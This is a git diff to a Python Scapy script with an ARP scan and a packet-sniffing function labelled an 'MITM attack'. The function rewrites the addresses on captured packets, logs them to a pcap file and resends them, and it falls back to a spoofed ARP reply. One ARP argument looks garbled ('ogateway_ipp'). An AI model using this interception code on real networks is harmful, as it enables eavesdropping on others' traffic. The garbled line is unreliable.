@@ -47,18 +47,24 @@ def arp_scan(target_ip = '192.168.0.0/24'):
     return clients
 
 # Sniff package and display them (MITM attack)
-def sniffing(src, dst, ws):
+def sniffing(src, dst):
     def editPkg(pkg):
+        print('.', end='')
+        sys.stdout.flush()
         pkg.psrc = src
         pkg.pdst = dst
         pkg.src = getmacbyip(src)
         pkg.dst = getmacbyip(dst)
-        # await pkg.show()
-        #Might actually not work
-        # sys.stdout.flush()
-        print(ws)
-        # ws.send("yo") 
-        send(pkg)
+        # pkg.show()
+        # await ws.send(pkg.build()) #Might actually not work
+        wrpcap("pcap/packet.pcap", pkg, append=True)
+        try:
+            send(pkg, verbose = False)
+        except:
+            send(ARP(ogateway_ipp = 2, psrc = dst, hwsrc = getmacbyip(dst), pdst = src, hwdst = getmacbyip(src)))
+
+
+
     
     sniff(prn=editPkg, filter="src " + src, stop_filter = lambda x: not getattr(threading.currentThread(), "do_run", True) )
 
